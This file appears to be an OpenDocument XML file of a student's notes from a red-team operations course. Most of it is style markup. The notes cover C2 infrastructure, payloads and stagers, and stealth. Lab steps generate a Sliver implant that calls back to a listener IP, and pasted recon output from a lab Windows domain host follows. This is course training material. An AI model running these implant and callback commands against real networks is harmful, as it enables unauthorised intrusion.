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4pt" style:font-size-complex="16pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00058b72" officeooo:paragraph-rsid="00058b72" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0006f364" officeooo:paragraph-rsid="0006f364" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="bold" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00058b72" officeooo:paragraph-rsid="00058b72" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0006f364" officeooo:paragraph-rsid="0006f364" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000c69fb" officeooo:paragraph-rsid="000c69fb" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000c69fb" officeooo:paragraph-rsid="000ef07d" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00123aa8" officeooo:paragraph-rsid="00123aa8" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0013fe16" officeooo:paragraph-rsid="0013fe16" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00175cc8" officeooo:paragraph-rsid="00175cc8" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00157cab" officeooo:paragraph-rsid="00157cab" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0006f364" officeooo:paragraph-rsid="0006f364" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0007a570" officeooo:paragraph-rsid="0007a570" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="000983d6" officeooo:paragraph-rsid="000983d6" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="000c69fb" officeooo:paragraph-rsid="000c69fb" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00157cab" officeooo:paragraph-rsid="00157cab" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0018c95c" officeooo:paragraph-rsid="0018c95c" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="0007a570" officeooo:paragraph-rsid="0007a570" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000983d6" officeooo:paragraph-rsid="000983d6" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000a9581" officeooo:paragraph-rsid="000a9581" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0006f364" officeooo:paragraph-rsid="0006f364" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0007a570" officeooo:paragraph-rsid="0007a570" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00157cab" officeooo:paragraph-rsid="00157cab" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0018c95c" officeooo:paragraph-rsid="0018c95c" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001a6ca5" officeooo:paragraph-rsid="001a6ca5" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0007a570" officeooo:paragraph-rsid="0007a570" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00157cab" officeooo:paragraph-rsid="00157cab" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00175cc8" officeooo:paragraph-rsid="00175cc8" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0018c95c" officeooo:paragraph-rsid="0018c95c" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001a6ca5" officeooo:paragraph-rsid="001a6ca5" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001e824e" officeooo:paragraph-rsid="001e824e" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-line-through-style="solid" style:text-line-through-type="single" fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001e824e" officeooo:paragraph-rsid="001e824e" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001e824e" officeooo:paragraph-rsid="001e824e" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" fo:font-size="16pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001e824e" officeooo:paragraph-rsid="001e824e" style:font-size-asian="14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058b72" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001a6ca5" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00058b72" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="00058b72"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00058b72"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6f364"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0a9581"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line-through-style="none" style:text-line-through-type="none"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="00123aa8"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="0013fe16"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="00175cc8"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="0018c95c"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="001a6ca5"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="001e82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span text:style-name="T4">Red Team Ops I</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Terms:</text:span></text:p>
      <text:p text:style-name="P3">Attacker-us</text:p>
      <text:p text:style-name="P3">Victim-them</text:p>
      <text:p text:style-name="P3">implant-tool we use</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5"><text:span text:style-name="T5">CP:</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T7">PROCE domain</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T7">4 animal named files </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T7">elevate privileges to extract files</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T7"/></text:p>
      <text:p text:style-name="P6">Tools:</text:p>
      <text:p text:style-name="P3">sliver (open source, easy to use/practice), Merlin, etc (check slides)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">Attacker Mindset:</text:p>
      <text:p text:style-name="P3">-attackers think in graphs, defenders think in lists: attackers will always win</text:p>
      <text:p text:style-name="P3">-<text:span text:style-name="T9">Objective: </text:span><text:span text:style-name="T10">always should be first thing red teamers do: info? Effects? Access?</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-find out as much info as you can about your target, RECON!!</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-objective might evolve as you learn more</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-take as few steps as possible</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-ALWAYS BLEND IN</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-stealth is key, must understand network, what is normal on user network</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T10">-</text:span><text:span text:style-name="T11">attackers often look through every piece of info they can, A LOT of user/network info and command output. READ EVERYTHING</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T10">Backend Infrastructure:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">-</text:span><text:span text:style-name="T9">attack stations</text:span><text:span text:style-name="T10">: computers we use to attack from, contain tools we use</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">-ideally ephemeral: tear down, spin up, change as necessary. Want flexibility</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">-</text:span><text:span text:style-name="T9">Team servers: </text:span><text:span text:style-name="T10">allows multiple operators to work together, central management point for ops, want tools to have a team server concept</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">-</text:span><text:span text:style-name="T9">Listeners: </text:span><text:span text:style-name="T10">listens for incoming agent-connections, multiple config options (Must remember config settings). Listener settings must match the call back settings (port numbers, etc)</text:span></text:p>
      <text:p text:style-name="P14">Redirectors: <text:span text:style-name="T12">don’t want all agents to call back to team server (not stealthy, easy to track, gives away team server location), provide multiple </text:span><text:soft-page-break/><text:span text:style-name="T12">tunnel/redirect locations to get back to team server. Usually easy to replace since they just handle traffic</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P28">Payloads:</text:p>
      <text:p text:style-name="P24">-agents don’t magically appear</text:p>
      <text:p text:style-name="P24">-payload is the artifact that creates an agent, that gets us access to a machine</text:p>
      <text:p text:style-name="P24">-executables, shellcode, script, macro, overflow</text:p>
      <text:p text:style-name="P24">-agent is what gives us access once payload executes</text:p>
      <text:p text:style-name="P24">-settings must match the settings of the listener</text:p>
      <text:p text:style-name="P15">Stager: <text:span text:style-name="T12">minimal code, reaches out, downloads, executes. Small, fits into more places. Use when we need to limit size of payload. May open up info about our payload. Excellent point for someone else to piggy back off of stager, get access to victim</text:span></text:p>
      <text:p text:style-name="P15">Stage-Less: <text:span text:style-name="T12">don’t user stager, entire executable all at once. Much larger than stagers, use when we don’t have network access to download files, can be faster, can be more stealthy since we don’t download anything. Less requirements/artifacts left behind</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T12">Infrastructure Testing: </text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12">-always test as much as possible before using tool</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12">-goal is to find issues while using tools</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12">-testing helps to eliminate unknowns</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12">-easiest way to test is to execute payload on a box you control-get to see both ends of your tool, see callbacks, see payload exec, etc</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T12">Lab 1:</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T14"><text:tab/>-deploy https listener on port 443, get executable, get callbacks</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T16">generate –http </text:span><text:a xlink:type="simple" xlink:href="https://172.25.255.102/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://172.25.255.102</text:a><text:span text:style-name="T16"> -N “name”</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T16">http -D </text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T16">change executable to “implant.exe”, put in tmp folder on remote server</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T16">“sessions” on sliver to check callback </text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T12">Callback:</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T12">-can be established by phishing, insider threat, USB, exploit, break in, etc</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T12">-only limited by legality and creativity</text:span></text:p>
      <text:p text:style-name="P16"><text:soft-page-break/><text:span text:style-name="T12">-now what? - </text:span><text:span text:style-name="T13">you are in someone elses network. On us to make sure we avoid detection, traps, minefields, etc. RECON!!</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T13">-have to learn as much as possible about network (what user you are, privileges, place in the network, defenses?, who else is on system, OS?, etc)</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T13">- then move onto network recon (other users on domain?, interesting domain groups? (admin?? → privileges), build target list, find credentials we can use, where is domain controller, network services, ID where credentials, find what “normal” looks like, file shares we can dig through?,</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T12">Lab #2: </text:span><text:span text:style-name="T14">enumerate network, find out any info as possible</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T14"><text:tab/>-find username, groups, os, domain, domain users+groups, any interesting files?</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T15">Username: stilgar, hostname = WK50</text:span></text:p>
      <text:p text:style-name="P8">“use” → enter → “shell”</text:p>
      <text:p text:style-name="P8">OS - Windows Server 2019</text:p>
      <text:p text:style-name="P8">two powershell users, PID 1892, 2736</text:p>
      <text:p text:style-name="P8">Ethernet connection, DHCP 172.25.2.1</text:p>
      <text:p text:style-name="P8"><text:s text:c="33"/>[02]: fe80::52c5:c830:3f:8afd</text:p>
      <text:p text:style-name="P8">Domain: <text:s text:c="19"/>rt1.lab</text:p>
      <text:p text:style-name="P8">Page File Location(s): <text:s text:c="4"/><text:a xlink:type="simple" xlink:href="../../../../../../C:/pagefile.sys" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">C:\pagefile.sys</text:a></text:p>
      <text:p text:style-name="P8">OS Name: <text:s text:c="18"/>Microsoft Windows Server 2019 Datacenter</text:p>
      <text:p text:style-name="P8">OS Version: <text:s text:c="15"/>10.0.17763 N/A Build 17763</text:p>
      <text:p text:style-name="P8">OS Manufacturer: <text:s text:c="10"/>Microsoft Corporation</text:p>
      <text:p text:style-name="P8">OS Configuration: <text:s text:c="9"/>Member Server</text:p>
      <text:p text:style-name="P8">OS Build Type: <text:s text:c="12"/>Multiprocessor Free</text:p>
      <text:p text:style-name="P8">Registered Owner: <text:s text:c="9"/>EC2</text:p>
      <text:p text:style-name="P8">Registered Organization: <text:s text:c="2"/>Amazon.com</text:p>
      <text:p text:style-name="P8">Product ID: <text:s text:c="15"/>00430-00000-00000-AA350</text:p>
      <text:p text:style-name="P8">Original Install Date: <text:s text:c="4"/>7/5/2023, 3:57:27 AM</text:p>
      <text:p text:style-name="P8">System Boot Time: <text:s text:c="9"/>7/5/2023, 7:03:36 AM</text:p>
      <text:p text:style-name="P8">System Manufacturer: <text:s text:c="6"/>Amazon EC2</text:p>
      <text:p text:style-name="P8">System Model: <text:s text:c="13"/>t3a.micro</text:p>
      <text:p text:style-name="P8">System Type: <text:s text:c="14"/>x64-based PC</text:p>
      <text:p text:style-name="P8">Processor(s): <text:s text:c="13"/>1 Processor(s) Installed.</text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:s text:c="27"/>[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz</text:p>
      <text:p text:style-name="P8">BIOS Version: <text:s text:c="13"/>Amazon EC2 1.0, 10/16/2017</text:p>
      <text:p text:style-name="P8">Windows Directory: <text:s text:c="8"/>C:\Windows</text:p>
      <text:p text:style-name="P8">System Directory: <text:s text:c="9"/>C:\Windows\system32</text:p>
      <text:p text:style-name="P8">Boot Device: <text:s text:c="14"/>\Device\HarddiskVolume1</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">d----- <text:s text:c="8"/>7/5/2023 <text:s text:c="2"/>3:58 AM <text:s text:c="15"/>Administrator <text:s text:c="36"/></text:p>
      <text:p text:style-name="P8">d----- <text:s text:c="8"/>7/5/2023 <text:s text:c="2"/>7:04 AM <text:s text:c="15"/>PAtreides <text:s text:c="40"/></text:p>
      <text:p text:style-name="P8">d-r--- <text:s text:c="6"/>12/12/2018 <text:s text:c="2"/>7:45 AM <text:s text:c="15"/>Public <text:s text:c="43"/></text:p>
      <text:p text:style-name="P8">d----- <text:s text:c="8"/>7/5/2023 <text:s text:c="2"/>7:09 AM <text:s text:c="15"/>Stilgar <text:s text:c="42"/></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">PS C:\Program Files&gt; net localgroup</text:p>
      <text:p text:style-name="P8">net localgroup</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Aliases for \\WKS0</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">-------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P8">*Access Control Assistance Operators</text:p>
      <text:p text:style-name="P8">*Administrators</text:p>
      <text:p text:style-name="P8">*Backup Operators</text:p>
      <text:p text:style-name="P8">*Certificate Service DCOM Access</text:p>
      <text:p text:style-name="P8">*Cryptographic Operators</text:p>
      <text:p text:style-name="P8">*Device Owners</text:p>
      <text:p text:style-name="P8">*Distributed COM Users</text:p>
      <text:p text:style-name="P8">*Event Log Readers</text:p>
      <text:p text:style-name="P8">*Guests</text:p>
      <text:p text:style-name="P8">*Hyper-V Administrators</text:p>
      <text:p text:style-name="P8">*IIS_IUSRS</text:p>
      <text:p text:style-name="P8">*Network Configuration Operators</text:p>
      <text:p text:style-name="P8">*Performance Log Users</text:p>
      <text:p text:style-name="P8">*Performance Monitor Users</text:p>
      <text:p text:style-name="P8">*Power Users</text:p>
      <text:p text:style-name="P8">*Print Operators</text:p>
      <text:p text:style-name="P8">*RDS Endpoint Servers</text:p>
      <text:p text:style-name="P8"><text:soft-page-break/>*RDS Management Servers</text:p>
      <text:p text:style-name="P8">*RDS Remote Access Servers</text:p>
      <text:p text:style-name="P8">*Remote Desktop Users</text:p>
      <text:p text:style-name="P8">*Remote Management Users</text:p>
      <text:p text:style-name="P8">*Replicator</text:p>
      <text:p text:style-name="P8">*Storage Replica Administrators</text:p>
      <text:p text:style-name="P8">*System Managed Accounts Group</text:p>
      <text:p text:style-name="P8">*Users</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Administrator</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">RT1</text:span>\Domain Admins – <text:span text:style-name="T18">tells us RT1/PAtreides is important</text:span></text:p>
      <text:p text:style-name="P8">RT1\Workstation Admins</text:p>
      <text:p text:style-name="P8">Stilgar</text:p>
      <text:p text:style-name="P9">The command completed successfully.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">“sa-whoami” → get info on user</text:p>
      <text:p text:style-name="P10">“sa-ipconfig”</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">ipconfig</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Windows IP Configuration</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ethernet adapter Ethernet 3:</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="3"/>Connection-specific DNS Suffix <text:s/>. : us-west-1.compute.internal</text:p>
      <text:p text:style-name="P9"><text:s text:c="3"/>Link-local IPv6 Address . . . . . : fe80::52c5:c830:3f:8afd%8</text:p>
      <text:p text:style-name="P9"><text:s text:c="3"/>IPv4 Address. . . . . . . . . . . : 172.25.2.101</text:p>
      <text:p text:style-name="P9"><text:s text:c="3"/>Subnet Mask . . . . . . . . . . . : 255.255.255.0</text:p>
      <text:p text:style-name="P9"><text:s text:c="3"/>Default Gateway . . . . . . . . . : 172.25.2.1</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">sliver (icb_https) &gt; info</text:p>
